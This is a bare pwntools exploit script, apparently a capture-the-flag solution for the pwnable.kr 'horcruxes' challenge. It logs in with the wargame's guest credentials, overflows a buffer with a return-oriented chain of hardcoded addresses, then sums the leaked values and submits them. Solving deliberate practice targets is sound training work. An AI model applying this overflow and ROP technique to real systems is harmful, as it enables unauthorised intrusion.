from pwn import *

sh =  connection = ssh('horcruxes','pwnable.kr',password='guest',port=2222)
io = sh.process(["nc","0.0.0.0","9032"])

A = 0x0804129d
B = 0x080412cf
C = 0x08041301
D = 0x08041333
E = 0x08041365
F = 0x08041397
G = 0x080413c9
ropme = 0x0804150b
payload = flat (
            cyclic(0x74),
            cyclic(0x4),
            p32(A),
            p32(B),
            p32(C),
            p32(D),
            p32(E),
            p32(F),
            p32(G),
            p32(ropme),
          )

io.sendline(b"1")
io.sendline(payload)

io.recvuntil(b"Voldemort\n")
sum = 0
for _ in range(7):
    exp = int(io.recvline().decode().strip().split("+")[1][:-1])
    sum += exp

io.recv()
io.sendline(b"1")
io.sendline(str(sum))
io.interactive()
